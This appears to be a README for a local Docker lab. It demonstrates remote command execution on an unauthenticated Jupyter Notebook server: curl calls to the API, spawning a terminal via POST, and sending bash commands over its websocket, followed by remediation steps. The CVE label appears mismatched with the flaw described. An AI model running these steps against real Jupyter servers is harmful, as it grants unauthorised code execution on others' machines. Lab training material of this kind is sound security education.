# Jupyter Notebook API Token Bypass & Terminal Command Injection (CVE-2019-10255)

## Overview

Jupyter Notebook is a web application widely used in AI/ML data science to create and share documents containing live code, equations, and visualizations. Vulnerability CVE-2019-10255 affects Jupyter Notebook configurations where password protection is not set and token validation contains logic flaws or API endpoints allow unauthenticated terminal spawning. An attacker can connect to the REST API, spawn a bash terminal websocket, and execute arbitrary commands.

- **Service Access**: `http://localhost:8148/`
- **Default Credentials**: `Unauthenticated / Token bypass`
- **Docker Shortcut**: `./lab start jupyter-token-bypass`
- **Container Name**: `cyberlab_industry_jupyter_notebook_rce`
- **RAM Footprint**: ~350M

---

## Exploitation Walkthrough

### 1. Inspect Jupyter API Status

```bash
curl -i http://localhost:8148/api
```

### 2. Create New Terminal Session via POST

```bash
curl -i -X POST http://localhost:8148/api/terminals
```

### 3. Connect to Terminal Websocket and Send Commands

```bash
# Connect to ws://localhost:8148/terminals/websocket/1 and issue bash commands directly.
```

---

## Defensive Remediation & Hardening

1. Upgrade Jupyter Notebook to version 5.7.8 or higher.
2. Mandate strong token authentication or enterprise OAuth/OIDC wrappers.
3. Disable terminal functionality with c.NotebookApp.terminals_enabled = False.

---

## Video Walkthroughs & Technical References

- [2024 Guide: Hacking APIs](https://www.youtube.com/watch?v=k5HZI6CfHw4)
- [Jupyter Notebook CVE-2019-10255 Advisory](https://nvd.nist.gov/vuln/detail/CVE-2019-10255)
- [Vulhub Jupyter Notebook Environment](https://vulhub.org/#/environments/jupyter/CVE-2019-10255/)
